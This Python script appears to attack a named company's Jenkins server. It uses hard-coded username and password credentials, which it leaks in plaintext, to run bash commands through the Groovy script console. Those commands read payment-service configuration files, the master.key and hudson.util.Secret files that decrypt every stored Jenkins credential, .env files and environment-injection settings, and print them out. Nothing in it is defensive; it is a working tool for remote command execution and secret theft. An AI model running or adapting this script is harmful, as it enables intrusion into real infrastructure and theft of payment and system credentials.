import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def run_groovy(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    r = opener.open(req, timeout=15)
    crumb = json.loads(r.read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']})
    r2 = opener.open(req2, timeout=90)
    return r2.read().decode()

# Query 1: T1Pagos local.php contents
print("=" * 60)
print("T1PAGOS local.php (latest)")
print("=" * 60)
q1 = 'def r = ["bash","-c","cat /var/jenkins_home/jobs/cs_new_front/jobs/cs_new_pipe_build_t1pagos-api-config/builds/2/archive/Microservicios/Box/t1/Dev/config/autoload/local.php"].execute().text\nprintln r'
print(run_groovy(q1))

# Query 2: local.php.dist
print("=" * 60)
print("T1PAGOS local.php.dist")
print("=" * 60)
q2 = 'def r = ["bash","-c","cat /var/jenkins_home/jobs/cs_new_front/jobs/cs_new_pipe_build_t1pagos-api-config/builds/2/archive/Microservicios/Box/t1/Dev/config/autoload/local.php.dist"].execute().text\nprintln r'
print(run_groovy(q2))

# Query 3: master.key
print("=" * 60)
print("MASTER.KEY")
print("=" * 60)
q3 = 'def r = ["bash","-c","cat /var/jenkins_home/secrets/master.key"].execute().text\nprintln r'
print(run_groovy(q3))

# Query 4: hudson.util.Secret base64
print("=" * 60)
print("HUDSON.UTIL.SECRET (base64)")
print("=" * 60)
q4 = 'def r = ["bash","-c","base64 -w0 /var/jenkins_home/secrets/hudson.util.Secret"].execute().text\nprintln r'
print(run_groovy(q4))

# Query 5: Search for more payment-related files in workspaces
print("=" * 60)
print("WORKSPACE PAYMENT FILES (broader)")
print("=" * 60)
q5 = 'def r = ["bash","-c","find /var/jenkins_home/workspace -maxdepth 4 -type f -name *.env 2>/dev/null | head -20"].execute().text\nprintln r'
print(run_groovy(q5))

# Query 6: EnvInject config
print("=" * 60)
print("ENVINJECT CONFIG")
print("=" * 60)
q6 = 'def r = ["bash","-c","cat /var/jenkins_home/envinject-plugin-configuration.xml"].execute().text\nprintln r'
print(run_groovy(q6))
